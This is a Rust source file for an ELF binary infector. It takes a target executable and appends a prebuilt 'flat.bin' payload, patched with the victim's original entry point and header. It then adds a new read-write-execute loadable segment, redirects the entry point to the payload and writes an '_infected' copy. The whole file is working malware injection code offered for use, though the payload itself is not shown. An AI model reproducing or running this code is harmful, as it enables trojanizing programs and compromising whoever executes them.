
use std::{env, fs};
use std::error::Error;
use std::mem::size_of;

use anyhow::Context;
use bytemuck::bytes_of;
use goblin::elf64::program_header::PT_LOAD;
use goblin::elf::program_header::{PF_R, PF_W, PF_X, PT_PHDR};
use crate::elf::ExecuteLinkFile;

mod elf;
mod celf;

const SUCC: &str = "\x1b[32m[+]\x1b[0m";
const FAIL: &str = "\x1b[31m[-]\x1b[0m";
const INFO: &str = "\x1b[34m[*]\x1b[0m";

fn reloc_bin(entry: u64, offset: u64, ehdr: &celf::ElfHeader) -> Result<(), Box<dyn Error>>
{
    let flat_elf = ExecuteLinkFile::prase("flat")?;

    let e_entry = flat_elf.prase_sym("_old_entry")?.st_value as usize;
    let load_offset = flat_elf.prase_sym("_load_address_offset")?.st_value as usize;
    let self_size = flat_elf.prase_sym("_self_size")?.st_value as usize;
    let victim_eh = flat_elf.prase_sym("_victim_eh")?.st_value as usize;

    let mut bin_buffer = fs::read("flat.bin")?;
    let bin_sz = bin_buffer.len();

    bin_buffer[e_entry..e_entry+8].copy_from_slice(&entry.to_le_bytes());
    bin_buffer[load_offset..load_offset+8].copy_from_slice(&offset.to_le_bytes());
    bin_buffer[self_size..self_size+8].copy_from_slice(&bin_sz.to_le_bytes());
    bin_buffer[victim_eh..victim_eh+size_of::<celf::ElfHeader>()].copy_from_slice(bytes_of(ehdr));

    print!("{SUCC} Set _old_entry={:#0x}. \r\n", entry);
    print!("{SUCC} Set _load_address_offset={:#0x}. \r\n", offset);

    fs::write("flat.bin", &bin_buffer)?;
    print!("{SUCC} Wrote {} bytes to flat.bin. \r\n", bin_buffer.len());

    Ok(())
}

pub fn main() -> Result<(), Box<dyn Error>> {
    let args: Vec<String> = env::args().collect();
    let target_path = args.get(1).context(format!("{FAIL} Insufficient Arguments."))?;
    
    let elf = ExecuteLinkFile::prase(target_path)?;
    let header = elf.get_elf_header()?;
    let entry = header.e_entry;
    let loads = elf.get_loads()?;
    let high_load = loads.iter().max_by_key(|x| x.p_vaddr).context(format!("{FAIL} Insufficient load segments."))?;
    let load_offset = (high_load.p_vaddr + high_load.p_memsz + 0x1000) & (!0xfffu64);

    print!("{INFO} Entry is {:#0x}. \r\n", entry);
    for i in &loads 
    {
        print!("{INFO} Found PT_LOAD segment: vaddr={:#0x}, size={:#0x}, end={:#0x}. \r\n", 
            i.p_vaddr, i.p_memsz, i.p_vaddr + i.p_memsz);
    }

    print!("{INFO} Load offset determined at {:#0x}. \r\n", load_offset);
    let mut target = fs::read(target_path)?;
    let ehdr_slice = target.get(0..size_of::<celf::ElfHeader>()).context("Broken Elf file")?;
    let ehdr_obj = bytemuck::try_from_bytes::<celf::ElfHeader>(ehdr_slice).ok().context("Broken Elf file")?;

    reloc_bin(entry, load_offset, ehdr_obj)?;

    let prog_hear_size = header.e_phentsize as usize * header.e_phnum as usize;
    let mut prog_hear_dump = target[(header.e_phoff as usize)..(header.e_phoff as usize) + prog_hear_size].to_vec();

    print!("{INFO} Current Target Size = {:#0x} \r\n", target.len());

    let bin_file_offset = (target.len() + 0x1000) & (!0xfffusize);
    target.append(&mut vec![0; bin_file_offset - target.len()]);

    let mut bin_data = fs::read("flat.bin")?;
    let bin_data_size = bin_data.len();
    target.append(&mut bin_data);

    print!("{SUCC} Flat bin copied to {:#0x}, size={:#0x}. \r\n", bin_file_offset, bin_data_size);

    let new_prog_header_offset = target.len();

    for i in (0..prog_hear_dump.len()).step_by(size_of::<celf::ProgramHeader>())
    {
        let segment_slice = prog_hear_dump.get_mut(i..i+size_of::<celf::ProgramHeader>()).context("Broken Program Header")?;
        if let Ok(c_seg) = bytemuck::try_from_bytes_mut::<celf::ProgramHeader>(segment_slice)
        {
            if c_seg.p_type == PT_PHDR
            {
                c_seg.p_filesz += size_of::<celf::ProgramHeader>() as u64;
                c_seg.p_memsz  += size_of::<celf::ProgramHeader>() as u64;
                c_seg.p_offset =  new_prog_header_offset as u64;
                c_seg.p_vaddr  =  load_offset as u64 + bin_data_size as u64;
                c_seg.p_paddr  =  load_offset as u64 + bin_data_size as u64;
            }
        }
    }

    print!("{SUCC} Program Header copied to {:#0x}. \r\n", new_prog_header_offset);
    let new_ph_size = prog_hear_dump.len() + size_of::<celf::ProgramHeader>() as usize;
    target.append(&mut prog_hear_dump);

    print!("{INFO} New Program Header size determined to {:#0x} \r\n", new_ph_size);

    let ph_seg = celf::ProgramHeader {
        p_type: PT_LOAD,
        p_flags: PF_R | PF_W | PF_X,
        p_offset: bin_file_offset as u64,
        p_vaddr: load_offset,
        p_paddr: load_offset,
        p_filesz: bin_data_size as u64 + new_ph_size as u64,
        p_memsz: bin_data_size as u64 + new_ph_size as u64,
        p_align: 0x1000u64
    };

    print!("{SUCC} New Segment added to {:#0x}. \r\n", target.len());
    target.append(&mut bytes_of(&ph_seg).to_vec());

    let elf_header_slice = target.get_mut(0..size_of::<celf::ElfHeader>()).context("Broken Elf file")?;
    if let Ok(c_elf_heaer) = bytemuck::try_from_bytes_mut::<celf::ElfHeader>(elf_header_slice)
    {
        c_elf_heaer.e_phoff = new_prog_header_offset as u64;
        c_elf_heaer.e_phnum += 1;
        c_elf_heaer.e_entry = load_offset as u64;
        print!("{SUCC} Set e_phoff={:#0x}, e_phnum={:#0x}, e_entry={:#0x}. \r\n",
            c_elf_heaer.e_phoff, c_elf_heaer.e_phnum, c_elf_heaer.e_entry);
    }

    let out = format!("{target_path}_infected");
    fs::write(&out, target)?;
    print!("{SUCC} Wrote to {out}. \r\n");
    Ok(())
}